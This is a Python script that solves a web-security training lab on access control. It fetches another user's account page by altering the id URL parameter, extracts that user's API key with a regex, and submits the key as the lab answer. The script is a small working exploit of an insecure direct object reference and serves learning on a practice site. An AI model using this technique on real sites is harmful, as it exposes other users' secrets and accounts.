#############################################################
#
# Lab: User ID controlled by request parameter
#
# Hack Steps: 
#      1. Fetch the carlos profile using id URL parameter
#      2. Extract the API key
#      3. Submit the solution
#
#############################################################
import requests
import re

# Change this to your lab URL
LAB_URL = "https://0a93001c0305cda58162fe7400c500ee.web-security-academy.net"

def main():
    print("⦗1⦘ Fetching carlos profile page.. ", end="", flush=True)

    carlos_profile = fetch("/my-account?id=carlos")        

    print("OK")
    print("⦗2⦘ Extracting the API key.. ", end="", flush=True)

    api_key = re.findall("Your API Key is: (.*)</div>", carlos_profile.text)[0]

    print("OK")
    print("⦗3⦘ Submitting the solution.. ", end="", flush=True)        

    data = { "answer": api_key }
    post_data("/submitSolution", data)

    print("OK")
    print("🗹 The lab should be marked now as " + "solved")



def fetch(path):
    try:  
        return requests.get(f"{LAB_URL}{path}", allow_redirects=False)
    except:
        print("⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, allow_redirects=False)
    except:
        print("⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)
        
        
if __name__ == "__main__":
    main()

